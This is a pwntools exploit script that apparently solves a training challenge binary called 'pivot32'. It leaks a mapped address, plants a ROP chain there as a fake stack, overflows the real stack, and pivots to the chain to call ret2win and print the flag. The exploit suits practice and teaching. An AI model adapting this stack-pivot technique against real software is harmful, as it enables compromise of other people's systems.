from pwn import p32
from pwn import u32
from pwn import process
from pwn import gdb
from pwn import context

ret2win_offset = 0x1f7
fhf_plt = 0x80485f0

context.terminal = ['xterm', '-e', 'sh', '-c']

p = process("./pivot32")
p.recvline()
p.recvline()
p.recvline()
p.recvline()
MA = p.recvline()[-11:].strip("\n") # Get address of fake stack write

print("[+] Mapped segment writing to: {}".format(MA))

# Fake Stack Written to Mapped Section
buf = p32(fhf_plt)
buf += p32(0x080488c0) # 0x080488c0: pop eax; ret;
buf += p32(0x804a024) # fhf_got
buf += p32(0x80488c4) # 0x080488c4: mov eax, dword ptr [eax]; ret;
buf += p32(0x08048571) # 0x08048571: pop ebx; ret;
buf += p32(ret2win_offset) # 0x1f7
buf += p32(0x80488c7) # 0x080488c7: add eax, ebx; ret;
buf += p32(0x080486a3) # 0x080486a3: call eax;
buf += p32(0xdeadbeef) # Show end of fake stack

# Stack Overwrite
buf2 = ""
buf2 += "A"*44 # Offset to esp overwrite
buf2 += p32(0x80488c0) # pop eax
buf2 += p32(int(MA,base=16)) # Mapped segment address
buf2 += p32(0x80488c2) # Stack pivot 0x080488c2: xchg eax, esp; ret;

#gdb.attach(p) # Attach gdb for debugging

p.recvuntil("> ")
p.sendline(buf) # Send Fake Stack
p.recvuntil("> ")
p.sendline(buf2) # Send Stack Overwrite
print("Flag: "+p.recvline()[-33:].strip("\n"))
